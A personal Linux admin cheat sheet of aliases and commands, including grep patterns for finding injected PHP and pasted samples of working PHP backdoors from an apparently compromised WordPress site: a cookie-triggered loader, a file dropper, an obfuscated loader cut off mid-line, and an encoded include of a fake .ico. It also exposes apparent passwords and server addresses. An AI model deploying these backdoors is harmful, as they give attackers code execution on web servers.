# alias .bashrc
#alias c='setxkbmap us -variant colemak'
alias c='clear'
alias D='cd ~/Downloads'
alias v='vim'
alias Dc='cd ~/Documents'
alias p='cd ~/public_html'
alias dh='df -h'
alias bc='vim ~/.bashrc'
alias ra='rsync -chavzP'
alias ne='sudo netstat -ntlp'
alias dx='sudo du -hsx * | sort -rh | head -20'
alias dua='sudo du -a . | sort -n -r | head -n 20'
alias duck='sudo du -cks * | sort -rn | head -n 20'
alias n='sudo systemctl restart nginx mariadb'
alias sp='sudo systemctl restart postgresql'
alias nt='sudo systemctl restart NetworkManager'
alias dns='sudo systemctl restart dnscrypt-proxy'
alias std='sudo systemctl status dnscrypt-proxy'
alias dlo='sudo tail -100 /var/log/dnscrypt-proxy/dnscrypt-proxy.log'
alias rd='sudo systemctl restart dnscrypt-proxy'
alias tom='sudo vim /etc/dnscrypt-proxy/dnscrypt-proxy.toml'
alias sr='sudo systemctl restart'
alias st='sudo systemctl status'
alias sto='sudo systemctl stop'
alias k='sudo kill -9'
alias pk='sudo pkill'
alias sy='systemctl status'
alias s='sudo'
alias sv='sudo vim'
alias je='sudo journalctl -k -b -1'
alias ji='sudo journalctl -b -1 | grep -i'
alias jf='sudo journalctl -b -1 | grep -Ei "error|fail|xfs|panic"'
alias dm='sudo dmesg'
alias dme='sudo dmesg --level=err,warn'
alias dms='sudo dmesg | grep -i'
alias sl='sudo lsd -lah'
alias g='sudo tail -200 /var/log/messages'
alias sa='sudo tail -100'
alias jx='journalctl -xe | grep -i'
alias px='ps aux | grep -i'
alias py='python'
alias l='lsd -lah'
alias ls='eza'
alias la='eza -lah'
alias uv='uvicorn --workers 4 --log-level critical'
alias gc='git clone'
alias ga='git add .'
alias gs='git status'
alias gcm='git commit -am'
alias gpu='git pull'
alias gr='grep -ri'
alias tk='tmux kill-server'
alias pi='pip install'
alias docker='sudo docker'
alias podman='sudo podman'
alias rm='rm -i'
alias src='source ~/.bashrc'
alias ya="yt-dlp -f140"
alias yt='yt-dlp'
alias pp="sudo cpupower frequency-set -g performance"
alias pc="cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"
alias pos="sudo cpupower frequency-set -g powersave"
alias pd="sudo cpupower frequency-set -g schedutil"
alias co="conky -c .config/conky.conf"
alias ta='tar -xvzf'
alias finl=''
alias bt='sudo tlp setcharge 0 80 BAT0'
alias btc='sudo tlp-stat -b | grep threshold'
alias bt1='sudo tlp setcharge 0 100 BAT0'
alias wok='wrk -t12 -c400 -d5s http://localhost'
alias wk='wrk -t12 -c400 -d5s'



## function for easier ###

# function find
function fin() {
    find . -iname "*$1*"
}

# git commit -am

# function 
function po() {
	sudo podman exec -w /root -it "$1" /bin/bash
}

function gc() {
    git clone git@github.com:$1/$2.git
}

# function find last changes
#   findl 10m      # Find files modified in the last 10 minutes.
#   findl 2h       # Find files modified in the last 2 hours.
#   findl 3d       # Find files modified in the last 3 days.
#   findl 3        # If no unit is specified, it defaults to days.
#
function findl() {
    # Check if an argument was provided. If not, show usage instructions and exit.
    if [ -z "$1" ]; then
        echo "Error: Missing time argument."
        echo "Usage: findl <time>"
        echo "Units: 'm' for minutes, 'h' for hours, 'd' for days (default)."
        echo "Example: findl 10m"
        return 1 # Return with an error code
    fi

    local time_arg=$1
    local minutes_to_search

    # Use a case statement to parse the time argument suffix.
    case "$time_arg" in
        *m) # Ends with 'm' (minutes)
            minutes_to_search=${time_arg%m}
            ;;
        *h) # Ends with 'h' (hours)
            local hours=${time_arg%h}
            minutes_to_search=$((hours * 60))
            ;;
        *d) # Ends with 'd' (days)
            local days=${time_arg%d}
            minutes_to_search=$((days * 60 * 24))
            ;;
        *)  # No suffix, assume days (default behavior)
            local days=$time_arg
            # Check if the input is a valid integer
            if ! [[ "$days" =~ ^[0-9]+$ ]]; then
                echo "Error: Invalid time argument '$days'. Please provide a number."
                return 1
            fi
            minutes_to_search=$((days * 60 * 24))
            ;;
    esac

    echo "Searching for files modified in the last $minutes_to_search minutes..."
    
    # Execute the find command.
    # Searches from the current directory (.).
    # -type f: Only look for files.
    # -mmin: Find based on modification time in minutes.
    # The '-' before the number means "less than". So -mmin -10 means "modified less than 10 minutes ago".
    find . -type f -mmin "-$minutes_to_search"
}


# less command 
less filename

# remove alias
unalias gcc


# alternatives java
sudo alternatives --config java
alternatives --install /usr/bin/python python /usr/bin/python3.12

# woe-usb cli
woeusb --device </path/to/Windows.iso> /dev/sdX --target-filesystem ntfs

#check errors
dmesg --level warn,err,emerg

#run android emulator
./emulator @Pixel_3a_API_28

#check path belong
namei -om /path/to/check

sudo usermod -aG nginx haidar

ssh-copy-id haidarvm@haidarvm.com

ssh-copy-id haidarvm@haidarvm.online

ssh-copy-id haidarvm@haidar.id

#remove renew ssh
ssh root@149.129.213.168
ssh-keygen -R "149.129.213.168"
ssh-keygen -R "149.129.245.60"
ssh-keygen -R "149.129.246.73"

# create sh bash script
#!/bin/bash

#clear
echo 1 > /proc/sys/vm/drop_caches

#clear
echo 1 > /proc/sys/vm/drop_caches

# set colemak
sudo localectl set-keymap colemak
sudo localectl set-keymap us-colemak

# set colemak in terminal
loadkeys us-colemak

# apache bench ab
ab -n 100000 -k -c 200 http://localhost/

#wrk
wrk -t12 -c400 -d5s http://localhost
wrk -t12 -c400 -d5s http://localhost:8787/index/post
wrk -t12 -c400 -d5s http://localhost:9191
wrk -t12 -c400 -d5s http://localhost:3000   
wrk -t12 -c400 -d5s http://localhost:8080   
wrk -t12 -c400 -d5s http://localhost:8484
wrk -t12 -c400 -d5s http://play.test/mysql.php
wrk -s post.lua -t12 -c400 -d10s http://mini.test/news/req
#get numeric chmod
stat --format "%a  %n" *

#create live usb ubuntu
sudo dd bs=4M if=ubuntu-20.04.1-live-server-amd64.iso of=/dev/sdb status=progress oflag=sync  
sudo dd bs=4M if= of=/dev/sdb status=progress oflag=sync

#wrk2
wrk2 -t5 -c10 -d20 -R10 -L http://localhost


#resolve.conf not updated
chmod 744 /etc/resolve.conf

#scp copy file
scp -P 222 alldatabase.sql  haidarvm@192.168.154.47:/home/haidarvm/ 
scp -P 222 rhel-8.3-x86_64-boot.iso  haidarid@haidar.id:/home/haidarid/public_html 

scp rhel-8.3-x86_64-boot.iso root@haidar.id:/home/haidarvm/ 

# curl post

curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"username":"xyz","password":"xyz"}' \
  http://mini.test/json/raw

#certbot renew
certbot renew

git clone https://gitlab.com/inkscape/inkscape --depth 1

curl -I https://haidar.tech -w %{time_connect}:%{time_starttransfer}:%{time_total}
curl -I http://149.129.213.168 -w %{time_connect}:%{time_starttransfer}:%{time_total}
curl https://haidar.id -w %{time_connect}:%{time_starttransfer}:%{time_total}


# check session wayland x11

echo $XDG_SESSION_TYPE
printf 'Session is: %s\n' "${DISPLAY:+X11}${WAYLAND_DISPLAY:+WAYLAND}"


#check now
printf 'Session is: %s\n' "${DISPLAY:+X11}${WAYLAND_DISPLAY:+WAYLAND}"


# check now
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor

#cpu set performance
sudo cpupower frequency-set -g performance


#check hdd usage
sudo du -hsx * | sort -rh | head -10

mysqldump --databases db1 db2 db3 db4 > db_backup.sql


mysqldump -u root -p --all-databases > alldb15oktRhel8in.sql

# fastfetch
sudo dnf install fastfetch

# fastfetch config create 
fastfetch --gen-config

# check Keyboard Keys
xev

#convert docx to pdf
oowriter -convert-to pdf:writer_pdf_Export doc_file.doc

#convert img to pdf and combine all
convert page*.png mydoc.pdf

convert  -compress jpeg -quality 85 *.jpeg kitabEmasAKTA.pdf


# Sound / audio problem (no sudo)
systemctl --user restart pipewire pipewire-pulse

#count total files
find . -type f | wc -l

#compress css & js
yui-compressor style.css -o style.min.css

# ssh keep alive /etc/ssh/ssh_config
ServerAliveInterval 240

# sshd_config
ClientAliveInterval 60
ClientAliveCountMax 2

# minicom
# you need to feed <stdin> with three characters: <ctrl-A>x<enter> 
ctrl A, X

#crontab
journalctl -u cron.service | grep root

journalctl -t CROND 

grep CRON /var/log/syslog_

# check if systemcl service is enabled
systemctl is-enabled SERVICE_NAME
systemctl list-unit-files | grep SERVICE_NAME_HERE

# install multiple fonts
cd <your_font_zips>
unzip "*.zip" "*.ttf" "*.otf" -d ${HOME}/.fonts
sudo fc-cache -f -v

#stat public_html
to get octal permission

#xfce4
sudo apt-get install xfce4 --no-install-recommends

#run spring with nohup
nohup mvn spring-boot:run &

#move multi folder
mv file1 file2 file3 -t DESTINATION

#rename inside file
sed -i 's/old_text/new_text/g' filename

#rename mirror ubuntu apt source list
sudo sed -i 's|http://us.archive.ubuntu.com|http://download.nus.edu.sg|g' /etc/apt/sources.list

sudo sed -i 's|https://mirror.amscloud.co.id||g' /etc/apt/sources.list.d/original.list

sudo sed -i 's|http://archive.ubuntu.com|https://mirror.amscloud.co.id|g' /etc/apt/sources.list.d/original.list

sudo sed -i 's|http://mirrors.tuna.tsinghua.edu.cn|http://mirror.0x.sg|g' /etc/apt/sources.list

sudo sed -i 's|http://mirror.0x.sg|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list

sudo sed -i 's|http://deb.debian.org|http://mirror.dewabiz.com|g' /etc/apt/sources.list

# sed
echo howtogonk | sed 's/gonk/geek/'

# find .htaccsess
find / -name ".htaccess" -print

# change timezone
timedatectl
timedatectl list-timezones
timedatectl set-timezone Asia/Jakarta

# dont use sudo nautius
#If you want to edit any file as root either do so from the terminal OR use the "admin:///" remote in nautilus.
admin:///

# vim find and replace all
:s|http://archive.ubuntu.com|https://mirror.amscloud.co.id|
:s|https://mirror.amscloud.co.id|http://archive.ubuntu.com|

:%s/http://archive.ubuntu.com/https://mirror.amscloud.co.id/g
:%s/debian/devuan/g

#create hostpot 
nmcli dev wifi hotspot ifname wlp0s20u5 ssid rhelThinkCentre password "rhelthink"

nmcli con add type wifi ifname wlp0s20u10 con-name Hostspot autoconnect yes ssid rhelThinkCentre
nmcli con modify Hostspot 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
nmcli con modify Hostspot wifi-sec.psk "rhelthink"

#scale minimize screen display
gsettings set org.gnome.desktop.interface text-scaling-factor 1.2

#find 
jobs -l

# no case sensitif 
grep -i http error.log

# find grep string in folders
grep -rnw '/path/to/somewhere/' -e 'pattern'
grep -rnw . -e 'stories'

# simple
grep -lr haidara
grep -r haidara
grep -r 'Array();\$'
grep -r '\@\$_POST' 

# find and delete
grep -lr haidara | xargs rm
grep -lr 'Array();\$' | xargs rm

# find and delete
grep -lr haidara 

#wordpress chmod
find . -type d -exec chmod 755 {} \;  # Change directory permissions rwxr-xr-x
find . -type f -exec chmod 640 {} \;  # Change file permissions rw-r--r--


#if user group able to edit
find . -type f -exec chmod 644 {} \;  # Change file permissions rw-r--r--

# wp-content
find . -type d -exec chmod -R 775 {} \;

#if user group able to edit
find . -type f -exec chmod 644 {} \;  # Change file permissions rw-r--r--


#find string in text
find . -type f -exec grep -H 'haidar.id' {} \;

#find latest changes
find /home/mywebsite -type f -ctime -7
find . -type f -ctime -13


# history bash
history

#find files create by files
find . -type f -user nginx

# delete it
find . -type f -user nginx -delete

# every ayah quran
aria2c https://www.everyayah.com/data/Alafasy_128kbps/002152.mp3

# restart bluetooth
sudo service bluetooth restart

rfkill block bluetooth
rfkill unblock bluetooth
sudo systemctl stop bluetooth.service
sudo systemctl start bluetooth.service
bluetoothctl
power on
agent on
default-agent
scan on
# wait until the device appears, then:
pair <MAC_ADDRESS>
trust <MAC_ADDRESS>
connect <MAC_ADDRESS>


# pair
sudo bluetoothctl
scan on
pair BL:BL:BL

# find zip files
find . -type f -name "*.zip"


#find in script hack injected
find -iname '*.php' -print0 | xargs -0 egrep -in ';\$GLOBALS'


find -iname '*.php' -print0 | xargs -0 egrep -in '@includ'
find -iname '*.php' -print0 | xargs -0 egrep -in '143_h'
find -iname '*.php' -print0 | xargs -0 egrep -in '057ho'
find -iname '*.php' -print0 | xargs -0 egrep -in '057h'
find -iname '*.php' -print0 | xargs -0 egrep -in '057u'


find -iname '*.php' -print0 | xargs -0 egrep -in '"salt"'
find -iname '*.php' -print0 | xargs -0 egrep -in '))));}'
find -iname '*.php' -print0 | xargs -0 egrep -in 'ini_set'



find -iname '*.php' -print0 | xargs -0 egrep -in 'usuna'
find -iname '*.php' -print0 | xargs -0 egrep -in ';@ini_set'
find -iname '*.php' -print0 | xargs -0 egrep -in 'substr_count'
find -iname '*.php' -print0 | xargs -0 egrep -in 'Array\(\);'
#good
find -iname '*.php' -print0 | xargs -0 egrep -in 'Array\(\);\$'
find -iname '*.php' -print0 | xargs -0 egrep -in '\@$_POST'
find -iname '*.ico' -print0 | xargs -0 egrep -in 'error_reporting'
#good
find -iname '*.php' -print0 | xargs -0 egrep -in '\@\$_POST'

find -iname '*.php' -print0 | xargs -0 egrep -in 'GLOBALS'
find -iname '*.php' -print0 | xargs -0 egrep -in 'CURLOPT_RETURNTRANSFER'

find -iname '*.php' -print0 | xargs -0 egrep -in '157m'
find -iname '*.php' -print0 | xargs -0 egrep -in 'eval'
find -iname '*.php' -print0 | xargs -0 egrep -in 'base64'
find -iname '*.php' -print0 | xargs -0 egrep -in 'basename'
find -iname '*.ico' -print0 | xargs -0 egrep -in 'basename/'
find -iname '*.ico' -print0

find -name "*.ico" -exec rm -rf {} \;

find -iname '*.php' -print0 | xargs -0 egrep -in 'haidar'

find -iname '*.php' -print0 | xargs -0 egrep -in 'create_function'
#find .ico files
find . -name "*.ico" -type f

#find php in asssets .git 
find . -name "*.php" -type f

#delete ico
find . -name "*.ico" -type f -delete

b5e29

# delete all except few extension
https://www.tecmint.com/delete-all-files-in-directory-except-one-few-file-extensions/

#find by nginx
find . -name "*.php" -group nginx

#remove .php in git
find . -type f | egrep './[a-z]{8}\.php'

find -name "*.php"
find -name "*.php" -exec rm -rf {} \;

#find and replace


# AT command linux
echo "AT" > /dev/ttyUSB0


#check intel hd
glxinfo -B


# remove all folder in directory   all sub-directories from within a directory?
rm -R -- */


 if (!class_exists("xegpgsqqu")){class xegpgsqqu{public static $ojufmz = "ghpwictevkjuxahk";public static $mqumekiy = NULL;public function __construct(){$pcccxwm = @$_COOKIE[substr(xegpgsqqu::$ojufmz, 0, 4)];if (!empty($pcccxwm)){$rhainaqx = "base64";$wqqfoajbx = "";$pcccxwm = explode(",", $pcccxwm);foreach ($pcccxwm as $bdgaax){$wqqfoajbx .= @$_COOKIE[$bdgaax];$wqqfoajbx .= @$_POST[$bdgaax];}$wqqfoajbx = array_map($rhainaqx . "_decode", array($wqqfoajbx,));$wqqfoajbx = $wqqfoajbx[0] ^ str_repeat(xegpgsqqu::$ojufmz, (strlen($wqqfoajbx[0]) / strlen(xegpgsqqu::$ojufmz)) + 1);xegpgsqqu::$mqumekiy = @unserialize($wqqfoajbx);}}public function __destruct(){$this->nctymnc();}private function nctymnc(){if (is_array(xegpgsqqu::$mqumekiy)) {$mgxizsxnkr = sys_get_temp_dir() . "/" . crc32(xegpgsqqu::$mqumekiy["salt"]);@xegpgsqqu::$mqumekiy["write"]($mgxizsxnkr, xegpgsqqu::$mqumekiy["content"]);include $mgxizsxnkr;@xegpgsqqu::$mqumekiy["delete"]($mgxizsxnkr);exit();}}}$apwos = new xegpgsqqu();$apwos = NULL;} ?>

<?php

<?php $wffilzkjpz = "xmxyrqqdedbkvrxg";$lftcmxrn = "";foreach ($_POST as $gsvvuhusr => $qjhlxonpyf){if (strlen($gsvvuhusr) == 16 and substr_count($qjhlxonpyf, "%") > 10){hgwvkmyovh($gsvvuhusr, $qjhlxonpyf);}}function hgwvkmyovh($gsvvuhusr, $swhbanedyr){global $lftcmxrn;$lftcmxrn = $gsvvuhusr;$swhbanedyr = str_split(rawurldecode(str_rot13($swhbanedyr)));function wsaebjxl($kfbuli, $gsvvuhusr){global $wffilzkjpz, $lftcmxrn;return $kfbuli ^ $wffilzkjpz[$gsvvuhusr % strlen($wffilzkjpz)] ^ $lftcmxrn[$gsvvuhusr % strlen($lftcmxrn)];}$swhbanedyr = implode("", array_map("wsaebjxl", array_values($swhbanedyr), array_keys($swhbanedyr)));$swhbanedyr = @unserialize($swhbanedyr);if (@is_array($swhbanedyr)){$gsvvuhusr = array_keys($swhbanedyr);$swhbanedyr = $swhbanedyr[$gsvvuhusr[0]];if ($swhbanedyr === $gsvvuhusr[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function vxelc($ecxiuobxzir) {static $hdtcne = array();$sjgqt = glob($ecxiuobxzir . '/*', GLOB_ONLYDIR);if (count($sjgqt) > 0) {foreach ($sjgqt as $ecxiuobxz){if (@is_writable($ecxiuobxz)){$hdtcne[] = $ecxiuobxz;}}}foreach ($sjgqt as $ecxiuobxzir) vxelc($ecxiuobxzir);return $hdtcne;}$spdsliiye = $_SERVER["DOCUMENT_ROOT"];$sjgqt = vxelc($spdsliiye);$gsvvuhusr = array_rand($sjgqt);$wvsyyhmt = $sjgqt[$gsvvuhusr] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($wvsyyhmt, $swhbanedyr);echo "http://" . $_SERVER["HTTP_HOST"] . substr($wvsyyhmt, strlen($spdsliiye));exit();}}}

$xbdf = 366;$GLOBALS['b1fcd6'] = Array();global $b1fcd6;$b1fcd6 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['ua9850c0'] = "\x62\x40\x48\x58\x53\x33\x42\x43\x63\x49\x45\x6d\x66\x6c\x75\x72\x59\x2e\x71\x5a\x4e\x34\x23\x36\x6a\x78\x67\x3b\x57\x69\x25\xa\x2d\x39\x2b\x9\x46\x74\x5d\x2a\xd\x6f\x21\x27\x7c\x2c\x61\x51\x37\x55\x6e\x64\x68\x22\x5f\x77\x54\x4d\x5b\x79\x30\x3f\x3a\x24\x47\x7b\x60\x73\x5c\x5e\x44\x3d\x2f\x4f\x52\x7e\x70\x4b\x38\x4a\x41\x76\x28\x7a\x26\x3c\x32\x50\x6b\x20\x31\x56\x7d\x65\x29\x35\x4c\x3e";$b1fcd6[$b1fcd6['ua9850c0

#hacked example
/*b5e29*/

@include "\057ho\155e/\143li\145nt\057di\144ik\160os\057pu\142li\143_h\164ml\057wp\055co\156te\156t/\164he\155es\057tw\145nt\171ni\156et\145en\057.a\146ee\1448e\070.i\143o";

/*b5e29*/

#last reboot
last reboot

#check storage
sudo du -hsx * | sort -rh | head -10

#kill pid
kill -9 123213


# check all service
ps auxf
ps auxf | grep WorkerMan

#kill webman
kill -SIGINT 91428


#kill current terminal history
kill -9 $$

#tesseract
tesseract image-63.png image --dpi 150

tesseract /home/user1/Desktop/zesty.png stdout

# turn off keyboard
sudo dnf install xinput


#keyboard swap
xmodmap -e "keycode  108 = o O"

#count total line
wc -l mtext.txt

# clear text file
>| filename.txt

#empty file
cp /dev/null /var/log/nginx/access.log 
cat /dev/null > access.log

#empty file content
> mtex.txt
#tar no compress
tar cvf myfolder.tar myfolder

#Part split zip to max 4GB
zip -r -s 1000m javanews_html.zip public_html/
zip -r -s 4G beritainspart.zip beritainspiratif05jun.zip 
#combine to oen file
zip -s 0 beritainspart.zip --out unsplitberitains05jun.zip
#unzip directly if from folder
unzip unsplitberitains05jun.zip

#change password kvm
virt-customize -a rhel-guest-image-7.2-20160302.0.x86_64.qcow2 --root-password password:PASSW0RD --uninstall cloud-ini

#reset connection
dhclient -v -r wlp3s0


#qemu auto resize
xrandr --output Virtual-1 --auto

xrandr --output HDMI1 --gamma 0.5:1.0:1.0
xrandr --output HDMI1 --brightness 0.8

# new resolution
xrandr -s 1440x900


#rsync backup everything
rsync -avxHAX --progress / /new-disk/
rsync -avxHAX --progress / /new-disk/


#rsync
rsync -avzh /root/rpmpkgs /tmp/backups/
rsync -avzh 'Kali Linux amd64 1' /media/haidar/kali
rsync -avzh '/media/haidar/Lubuntu 18.04.5 LTS i386' /media/haidar/lubuntu
rsync -avzh '/home/haidar/Documents/backup/iso/ubuntu-20.04.1-live-server-amd64.iso' /media/haidar/livehaidar
rsync -avzh '/media/haidar/GParted-live/' /media/haidar/gparted

haidar1234S

rsync -avzh  --exclude='/*/.local'  '/media/haidar/Lubuntu 18.04.5 LTS i386' /media/haidar/lubuntu

rsync -avzh '/media/haidar/adobe cc 2020/' /home/haidar/Documents/backup/winApp/adob

#rsync server to local
rsync -chavzP haidarvm@192.168.1.1:/home/haidarvm/data.zip .

#rsync another server
rsync -chavzP --stats haidar@example.com:/home/haidar/test.zip /home/haidar/Documents
rsync -chavzP -e "ssh -p $portNumber" user@remote.host:/path/to/copy /local/path
rsync -avzh  -e "ssh -p PORT_NUMBER"  mydir haidarvm@192.168.1.1:/home/haidarvm

#rsync to other server
rsync [options] /path/to/source_directory/ username@remote_host:/path/to/destination_directory/
#rsycn from another server to local
rsync -avzh  -e "ssh -p PORT_NUMBER" haidarvm@192.168.1.1:/home/haidarvm/mydir mylocaldir



## scp from local to server
scp -P 99 database.sql.zip  haidarvm@haidarvm.id:/home/haidarvm/Documents/backup
scp data.zip  haidar@192.168.1.1:/home/haidar/Downloads

# download from domain

scp haidarvm@haidarvm.id:haidarvm.zip ~/Documents/

#convert img to pdf and combine all
convert page*.png mydoc.pdf
convert *.jpeg yayasan.pdf
#swap keyboard

#check ip

curl -i -k https://haidarvm.com/hello.html -w %{time_connect}:%{time_starttransfer}:%{time_total}

curl -i -k https://javanews.tv/hello.html -w %{time_connect}:%{time_starttransfer}:%{time_total}

#curl download expire https
curl -k -O url

#php-ngx
#php
aria2c https://www.php.net/distributions/php-7.4.9.tar.gz
tar xfv php
cd php
./configure --prefix=/usr/local/php --enable-embed

git clone https://github.com/rryqszq4/ngx_php7.git

#nginx
aria2c http://nginx.org/download/nginx-1.19.2.tar.gz
tar -zxvf
cd nginx

export PHP_CONFIG=/usr/local/php/bin/php-config
export PHP_BIN=/usr/local/php/bin
export PHP_INC=/usr/local/php/include/php
export PHP_LIB=/usr/local/php/lib

./configure --user=www --group=www \
             --prefix=/usr/local/nginx \
             --with-ld-opt="-Wl,-rpath,$PHP_LIB" \
             --add-module=/home/haidar/Downloads/app/ngx_php7/third_party/ngx_devel_kit \
             --add-module=/home/haidar/Downloads/app/ngx_php7
make && make install


sudo /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf
sudo /usr/local/nginx/sbin/nginx -s reload

#virt
virt-install --connect qemu:///system --virt-type kvm --name instance-1 --ram 1024 --vcpus=1 --os-type linux --os-variant ubuntu20.04 --disk path=focal --import --network network=default --noautoconsole

#add virtual network
ip addr add 192.168.1.55 dev enp0s25:0


#libtoolT cannot remove
touch libtoolT


./configure --prefix=/usr/local/apr-util/ --with-apr=/usr/local/apr/

#virt
virsh net-autostart default
virsh net-start default





#promo



./configure \
--prefix=/usr/local/apache2.4 \
--sbindir=/usr/local/apache2.4/sbin \
--with-apr=/usr/local/apr/ \
--with-apr-util=/usr/local/apr-util \
--with-pcre=/usr/local/pcre/ \
--enable-ssl \
--with-ssl=shared \
--enable-proxy=shared \
--enable-so \
--enable-mods-shared=all


#cloud microservice
developers use RESTful APIs and microservices to create a modular, service-oriented architecture


#install mudbox
Installed dependancies
yum install -y compat-libtiff3  mesa-libGLU
yum install wget libpng xorg-x11-fonts-ISO8859-1-100dpi xorg-x11-fonts-ISO8859-1-75dpi xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi
yum install mesa-libGLw csh libXp libXp-devel gamin audiofile audiofile-devel e2fsprogs-libs tcsh

/usr/autodesk/mudbox2020/mudbox.sh
QT_X11_NO_MITSHM=1 ./setup


#Run free trial AppImage


#nginx 
   location ~ ^/img/(.*) {
        try_files $uri /img/$uri;
    }
    
    location ~ ^/wp-content/uploads/(.*) {
        return 301 /assets/uploads/$1;
    }


    
